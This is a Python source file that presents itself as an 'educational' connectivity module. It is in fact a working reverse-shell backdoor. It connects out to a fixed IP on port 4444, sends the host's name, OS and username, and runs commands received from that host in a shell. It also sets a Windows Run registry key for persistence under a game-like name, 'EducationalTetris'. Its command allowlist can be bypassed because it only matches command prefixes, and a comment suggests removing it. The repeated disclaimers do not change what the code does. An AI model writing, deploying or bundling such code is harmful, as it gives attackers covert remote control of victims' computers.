# connectivity_module.py
# IMPORTANT: This is for EDUCATIONAL PURPOSES ONLY
# This demonstrates security concepts in a controlled environment

import socket
import threading
import subprocess
import os
import sys
import platform
import time
import winreg  # For Windows registry operations

class EducationalConnector:
    """
    Educational class demonstrating security concepts related to:
    - Checking dependencies
    - Creating connections for educational purposes
    - Demonstrating persistence concepts
    
    THIS IS FOR EDUCATIONAL PURPOSES ONLY in a controlled environment
    """
    
    def __init__(self, server_address=('10.12.73.122', 4444)):
        self.server_address = server_address
        self.running = False
        self.connection = None
        self.startup_key_name = "EducationalTetris"
    
    def check_dependencies(self):
        """Check if required dependencies are installed."""
        required_apps = {
            'python': 'python',
            'pygame': 'pygame'
        }
        
        missing_apps = []
        
        # Check Python
        try:
            subprocess.check_call([required_apps['python'], '--version'], 
                                  stdout=subprocess.DEVNULL, 
                                  stderr=subprocess.DEVNULL)
        except (subprocess.SubprocessError, FileNotFoundError):
            missing_apps.append('python')
        
        # Check Pygame
        try:
            import pygame
        except ImportError:
            missing_apps.append('pygame')
        
        return missing_apps
    
    def install_dependencies(self, missing_apps, local_server='http://10.12.73.122:8000'):
        """
        Simulate installing missing dependencies from a local server.
        
        In a real educational environment, this would download and install 
        packages from a controlled local server.
        """
        for app in missing_apps:
            # Simulate downloading from local server
            print(f"Downloading {app} from {local_server}/{app}.zip")
            time.sleep(1)  # Simulate download time
            
            # Simulate installation
            print(f"Installing {app}...")
            if app == 'pygame':
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pygame'], 
                              stdout=subprocess.DEVNULL, 
                              stderr=subprocess.DEVNULL)
            time.sleep(2)  # Simulate installation time
            
            print(f"{app} installed successfully")
    
    def create_educational_connection(self):
        """
        Create an educational connection to demonstrate security concepts.
        
        THIS IS FOR EDUCATIONAL PURPOSES ONLY in a controlled environment.
        In a real educational setting, this would establish a connection back
        to the instructor's machine for demonstration.
        """
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect(self.server_address)
            self.running = True
            
            # Send system information for educational demonstration
            system_info = self.get_system_info()
            self.connection.send(system_info.encode())
            
            # Start the command handling thread
            threading.Thread(target=self.handle_commands, daemon=True).start()
            
            return True
        except Exception as e:
            print(f"Educational connection error: {e}")
            return False
    
    def get_system_info(self):
        """Gather basic system information for educational demonstration."""
        info = f"""
        --- Educational Cybersecurity Demo ---
        OS: {platform.system()} {platform.version()}
        Hostname: {platform.node()}
        Username: {os.getlogin()}
        Python Version: {platform.python_version()}
        """
        return info
    
    def handle_commands(self):
        """
        Handle commands from the educational listener.
        
        THIS IS FOR EDUCATIONAL PURPOSES ONLY in a controlled environment.
        """
        while self.running:
            try:
                command = self.connection.recv(1024).decode().strip()
                
                if not command:
                    continue
                
                if command.lower() == "exit":
                    self.running = False
                    break
                
                # Execute the command and get the output
                output = self.execute_command(command)
                
                # Send the output back
                self.connection.send(output.encode())
                
            except Exception as e:
                print(f"Command handling error: {e}")
                self.running = False
                break
    
    def execute_command(self, command):
        """
        Execute a system command and return the output.
        
        THIS IS FOR EDUCATIONAL PURPOSES ONLY in a controlled environment.
        """
        try:
            # For educational purposes, restrict commands to safe commands
            # Either remove the whitelist check entirely, or expand it
            safe_commands = ["dir", "ls", "pwd", "whoami", "echo", "hostname", "type", "cat", "cd", "systeminfo", "netstat", "ipconfig", "ifconfig"]
            
            # Check if command starts with any safe command
            is_safe = False
            for safe_cmd in safe_commands:
                if command.lower().startswith(safe_cmd):
                    is_safe = True
                    break
            
            if not is_safe:
                return "Error: Command not allowed for educational demonstration"
            
            # Execute the command
            if platform.system() == "Windows":
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
            else:
                process = subprocess.Popen(["/bin/sh", "-c", command], 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE, 
                                         stdin=subprocess.DEVNULL)
            
            stdout, stderr = process.communicate(timeout=15)
            
            if stderr:
                return f"Error: {stderr.decode()}"
            
            return stdout.decode() or "Command executed successfully"
        
        except subprocess.TimeoutExpired:
            return "Error: Command timed out"
        except Exception as e:
            return f"Error executing command: {e}"
    
    def add_to_startup(self, executable_path):
        """
        Educational demonstration of persistence concepts.
        
        THIS IS FOR EDUCATIONAL PURPOSES ONLY in a controlled environment.
        This demonstrates how malware might achieve persistence through
        startup registry keys.
        """
        if platform.system() != "Windows":
            print("Persistence demonstration only available on Windows")
            return False
        
        try:
            # Open the run registry key
            registry_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, 
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                0, 
                winreg.KEY_WRITE
            )
            
            # Set the registry value
            winreg.SetValueEx(
                registry_key, 
                self.startup_key_name, 
                0, 
                winreg.REG_SZ, 
                executable_path
            )
            
            # Close the registry key
            winreg.CloseKey(registry_key)
            return True
        
        except Exception as e:
            print(f"Failed to demonstrate persistence: {e}")
            return False
    
    def cleanup(self):
        """Clean up the educational demonstration."""
        try:
            # Close the connection
            if self.connection:
                self.connection.close()
            
            # Remove from startup (educational demonstration)
            self.remove_from_startup()
            
            return True
        except Exception as e:
            print(f"Cleanup error: {e}")
            return False
    
    def remove_from_startup(self):
        """
        Remove the educational demonstration from startup.
        
        THIS IS FOR EDUCATIONAL PURPOSES ONLY in a controlled environment.
        """
        if platform.system() != "Windows":
            return
        
        try:
            # Open the run registry key
            registry_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, 
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                0, 
                winreg.KEY_WRITE
            )
            
            # Delete the registry value
            winreg.DeleteValue(registry_key, self.startup_key_name)
            
            # Close the registry key
            winreg.CloseKey(registry_key)
        except Exception as e:
            print(f"Failed to remove from startup: {e}")

# Example usage (not executed when imported)
if __name__ == "__main__":
    # This code runs only when script is executed directly
    # It DOES NOT run when the script is imported
    connector = EducationalConnector()
    missing_apps = connector.check_dependencies()
    
    if missing_apps:
        print(f"Missing apps: {missing_apps}")
        connector.install_dependencies(missing_apps)
    
    if connector.create_educational_connection():
        print("Educational demonstration running...")
    else:
        print("Failed to start educational demonstration")